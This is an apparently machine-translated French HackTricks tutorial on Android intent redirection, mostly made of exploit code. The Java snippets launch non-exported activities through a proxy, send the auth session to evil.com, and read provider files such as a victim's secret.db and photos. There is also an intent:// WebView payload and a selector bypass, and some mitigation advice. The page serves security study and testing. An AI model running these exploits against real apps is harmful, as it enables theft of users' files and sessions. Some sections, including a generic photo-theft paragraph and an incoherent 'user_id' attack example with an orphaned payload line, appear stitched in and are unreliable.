<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Recherche tir√©e de** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# Introduction

Cette vuln√©rabilit√© ressemble √† **Open Redirect en s√©curit√© web**. √âtant donn√© que la classe `Intent` est `Parcelable`, **les objets appartenant √† cette classe** peuvent √™tre **pass√©s** en tant que **donn√©es suppl√©mentaires** dans un autre objet `Intent`. \
De nombreux d√©veloppeurs **utilisent** cette **fonctionnalit√©** et cr√©ent des **composants proxy** (activit√©s, r√©cepteurs de diffusion et services) qui **prennent un Intent int√©gr√© et le passent √† des m√©thodes dangereuses** telles que `startActivity(...)`, `sendBroadcast(...)`, etc. \
C'est dangereux car **un attaquant peut forcer l'application √† lancer un composant non export√© qui ne peut pas √™tre lanc√© directement depuis une autre application**, ou √† accorder √† l'attaquant l'acc√®s √† ses fournisseurs de contenu. **`WebView`** change parfois √©galement une **URL d'une cha√Æne en un objet `Intent`**, en utilisant la m√©thode `Intent.parseUri(...)` et le passe √† `startActivity(...)`.

{% hint style="info" %}
En r√©sum√© : Si un attaquant peut envoyer un Intent qui est ex√©cut√© de mani√®re non s√©curis√©e, il peut potentiellement acc√©der √† des composants non export√©s et les exploiter.
{% endhint %}

# Un cas typique

Examinons un exemple. Fragment du fichier `AndroidManifest.xml`.
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
Activit√© `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
Activit√© `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity` est un exemple de **fonctionnalit√© cach√©e de l'application qui effectue certaines actions non s√©curis√©es**, en l'occurrence en passant la session d'authentification de l'utilisateur √† une URL obtenue √† partir du param√®tre `url`.

Les restrictions d'exportation signifient que **l'attaquant ne peut pas acc√©der directement √† `AuthWebViewActivity`**. Un appel direct...
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
Lance une `java.lang.SecurityException`, en raison d'un `Refus de Permission`: `AuthWebViewActivity` n'est pas export√© √† partir de l'uid 1337.

Mais l'attaquant peut forcer la victime √† lancer `AuthWebViewActivity` elle-m√™me:
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
et aucune violation de s√©curit√© ne se produira, car **l'application qui est attaqu√©e a acc√®s √† tous ses propres composants**. En utilisant ce fragment de code, l'attaquant peut contourner les restrictions int√©gr√©es du syst√®me Android.

# Escalade de l'impact

Afin d'escalader l'impact de cette vuln√©rabilit√©, vous devez **trouver d'autres vuln√©rabilit√©s / erreurs de configuration qui pourraient permettre d'augmenter l'impact de la vuln√©rabilit√©** (car la vuln√©rabilit√© en elle-m√™me ne cr√©e aucun risque).

## Escalade des attaques via les fournisseurs de contenu

Outre l'acc√®s √† des composants arbitraires de l'application d'origine, l'**attaquant peut tenter d'acc√©der √† ceux des fournisseurs de contenu de l'application vuln√©rable** qui satisfont les conditions suivantes :

* il doit √™tre **non export√©** (sinon il **pourrait √™tre attaqu√© directement**, sans utiliser la vuln√©rabilit√© que nous discutons dans cet article)
* il doit avoir le drapeau **`android:grantUriPermissions`** d√©fini sur **`true`**.
  * `android:grantUriPermissions="true"` indique que votre code Java peut utiliser `FLAG_GRANT_READ_URI_PERMISSION` et `FLAG_GRANT_WRITE_URI_PERMISSION` pour **n'importe quelle `Uri` servie par ce `ContentProvider`**.
  * `android:grantUriPermissions="false"` indique que **seuls les `Uri` sp√©cifi√©es par les √©l√©ments enfant `<grant-uri-permission>`** peuvent √™tre utilis√©es avec `FLAG_GRANT_READ_URI_PERMISSION` et `FLAG_GRANT_WRITE_URI_PERMISSION`.

L'attaquant doit se d√©finir comme destinataire d'une intention int√©gr√©e et d√©finir les indicateurs suivants :

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` permet un acc√®s persistant au fournisseur (sans ce drapeau, l'acc√®s n'est valable qu'une seule fois)
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` permet l'acc√®s URI par pr√©fixe - par exemple, au lieu d'obtenir un acc√®s s√©par√© √† chaque fois en utilisant un chemin complet tel que `content://com.victim.provider/image/1`, l'attaquant peut accorder l'acc√®s √† tout le contenu du fournisseur en utilisant l'URI `content://com.victim.provider/` et ensuite utiliser `ContentResolver` pour adresser `content://com.victim.provider/image/1`, `content://com.victim.provider/image/2`, etc.
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` permet des op√©rations de lecture sur le fournisseur (telles que `query`, `openFile`, `openAssetFile`)
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` permet des op√©rations d'√©criture

Un exemple de fournisseur typique o√π un attaquant peut y acc√©der et effectuer des op√©rations r√©guli√®res telles que `query`, `update`, `insert`, `delete`, `openFile`, `openAssetFile`.
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
# Exemple de vol de photos d'utilisateur dans le fichier `AndroidManifest.xml`

Lorsqu'une application Android demande l'autorisation d'acc√©der √† la galerie de photos de l'utilisateur, elle doit inclure cette autorisation dans son fichier `AndroidManifest.xml`. Si l'application ne sp√©cifie pas correctement les autorisations requises, un attaquant peut exploiter cette vuln√©rabilit√© pour acc√©der aux photos de l'utilisateur sans son consentement.

Pour ce faire, l'attaquant peut utiliser une technique appel√©e "injection d'intent". Cela implique de cr√©er une application malveillante qui envoie un intent √† l'application cible pour acc√©der √† ses autorisations. Si l'application cible ne v√©rifie pas correctement les autorisations, l'attaquant peut acc√©der aux photos de l'utilisateur et les voler.

Pour se prot√©ger contre cette vuln√©rabilit√©, les d√©veloppeurs doivent s'assurer que leur application v√©rifie correctement les autorisations avant d'acc√©der √† des donn√©es sensibles telles que les photos de l'utilisateur. Les utilisateurs doivent √©galement √™tre conscients des autorisations demand√©es par les applications et ne pas accorder d'autorisations excessives √† des applications non fiables.
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
Fichier `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
        | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
        | Intent.FLAG_GRANT_READ_URI_PERMISSION
        | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Attaques sur Android File Provider

Cette vuln√©rabilit√© permet √©galement √† l'attaquant de **voler des fichiers d'application** situ√©s dans des r√©pertoires pr√©d√©termin√©s par le d√©veloppeur. Pour une attaque r√©ussie, l'application malveillante doit **obtenir des droits d'acc√®s √† Android File Provider, puis lire le contenu du fournisseur de fichiers √† l'aide d'Android ContentResolver**.

Exemple de fournisseur de fichiers (pour plus de d√©tails, voir [https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider))
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
Il fournit un acc√®s en lecture/√©criture aux fichiers d'une liste sp√©ciale qui peut √™tre trouv√©e dans les ressources de l'application, dans ce cas √† `res/xml/provider_paths.xml`

Cela peut ressembler √† ceci
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path name="root" path=""/>
    <files-path name="internal_files" path="."/>
    <cache-path name="cache" path=""/>
    <external-path name="external_files" path="images"/>
</paths>
```
Chaque balise sp√©cifie un r√©pertoire racine avec une valeur `path` relative √† la racine. Par exemple, la valeur `external_files` correspondra √† `new File(Environment.getExternalStorageDirectory(), "images")`.

La valeur `root-path` correspond √† `/`, c'est-√†-dire qu'elle permet d'acc√©der √† des fichiers arbitraires.

Supposons que nous avons des donn√©es secr√®tes stock√©es dans le fichier `/data/data/com.victim/databases/secret.db`: le vol de ce fichier peut ressembler √† ceci dans `MainActivity.java`.
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## Acc√®s √† des composants arbitraires via WebView

Un objet Intent peut √™tre converti en cha√Æne avec un appel √† `Intent.toUri(flags)` et de nouveau d'une cha√Æne √† un Intent en utilisant `Intent.parseUri(stringUri, flags)`. Cette fonctionnalit√© est souvent utilis√©e dans WebView (le navigateur int√©gr√© de l'application) : l'application peut v√©rifier un sch√©ma `intent://`, analyser l'URL en un Intent et lancer l'activit√©.

**Cette vuln√©rabilit√© peut √™tre exploit√©e √† la fois via d'autres vuln√©rabilit√©s** (par exemple, la capacit√© d'ouvrir des liens arbitraires dans l'application dans WebView directement via des activit√©s export√©es ou par le biais du m√©canisme de lien profond) dans l'application cliente et √©galement √† distance, y compris la cross-site scripting c√¥t√© serveur ou MitM c√¥t√© client.

Exemple de code vuln√©rable
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if("intent".equals(uri.getScheme())) {
        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
        return true;
    }
    return super.shouldOverrideUrlLoading(view, request);
}
```
Le point ici est que la m√©thode `shouldOverrideUrlLoading(...)` de la classe `WebViewClient` est appel√©e chaque fois que WebView essaie de charger un nouveau lien, mais donne √† l'application la possibilit√© d'ajouter un gestionnaire personnalis√©.

Pour exploiter cette vuln√©rabilit√©, l'attaquant doit cr√©er une redirection WebView vers une URL de sch√©ma d'intention sp√©cialement pr√©par√©e. Exemple de cr√©ation d'URL
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
# Exemple d'attaque

Supposons que nous ayons une application qui utilise une `Intent` pour lancer une activit√© qui affiche les d√©tails d'un utilisateur. L'activit√© est lanc√©e en utilisant l'ID de l'utilisateur comme extra dans l'intent. Le code ressemblerait √† ceci :

```java
Intent intent = new Intent(this, UserDetailsActivity.class);
intent.putExtra("user_id", user_id);
startActivity(intent);
```

Un attaquant peut exploiter cette fonctionnalit√© en injectant une `Intent` malveillante qui remplace l'ID de l'utilisateur par un ID diff√©rent. Par exemple, l'attaquant peut cr√©er une `Intent` qui remplace l'ID de l'utilisateur par l'ID de l'administrateur :

```java
Intent intent = new Intent(this, UserDetailsActivity.class);
intent.putExtra("user_id", admin_id);
startActivity(intent);
```

Si l'application ne v√©rifie pas l'identit√© de l'utilisateur avant d'afficher les d√©tails, l'attaquant peut acc√©der aux informations sensibles de l'administrateur.
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
Cette version contient **plusieurs restrictions par rapport √† la version classique de la vuln√©rabilit√©** :

* Les objets int√©gr√©s `Parcelable` et `Serializable` ne peuvent pas √™tre convertis en cha√Æne de caract√®res (ils seront ignor√©s)
* Les indicateurs d'ins√©curit√© `Intent.FLAG_GRANT_READ_URI_PERMISSION` et `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` sont **ignor√©s** lorsque `Intent.parseUri(...)` est appel√©. Le parseur ne les laissera que si le drapeau `Intent.URI_ALLOW_UNSAFE` (`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))` est d√©fini, ce qui est tr√®s rare.

De nombreux d√©veloppeurs oublient encore de filtrer compl√®tement les intents re√ßus via WebView.
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if("intent".equals(uri.getScheme())) {
    	Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
    	intent.addCategory("android.intent.category.BROWSABLE");
    	intent.setComponent(null);
      startActivity(intent);
      return true;
    }
    return super.shouldOverrideUrlLoading(view, request);
}
```
L'attaquant peut sp√©cifier un composant non export√© via un s√©lecteur.
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
Et contourner la protection de l'application contre les intents explicites. Nous recommandons donc √©galement de filtrer le s√©lecteur.
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
Mais m√™me un filtrage complet ne garantit pas une protection compl√®te, car un attaquant peut cr√©er une intention implicite correspondant au `intent-filter` d'une activit√© non export√©e. Exemple de d√©claration d'activit√©:
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="victim" android:host="secure_handler" />
    </intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
Nous recommandons donc de v√©rifier si une activit√© est export√©e avant de la lancer.

## Autres fa√ßons de cr√©er des intents non s√©curis√©s

Certains d√©veloppeurs d'applications impl√©mentent leurs propres analyseurs d'intent (souvent pour g√©rer des liens profonds ou des messages push), en utilisant par exemple des objets JSON, des cha√Ænes de caract√®res ou des tableaux d'octets, qui ne diff√®rent pas de la valeur par d√©faut ou pr√©sentent un grand danger, car ils peuvent √©tendre des objets `Serializable` et `Parcelable` et permettent √©galement de d√©finir des indicateurs non s√©curis√©s. Le chercheur en s√©curit√© peut √©galement rencontrer des versions plus exotiques de cr√©ation d'intent, telles que la conversion d'un tableau d'octets en un `Parcel` puis la lecture d'un intent √† partir de celui-ci.
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
    byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
    Parcel parcel = Parcel.obtain();
    parcel.unmarshall(handle, 0, handle.length);
    startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# Vuln app

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
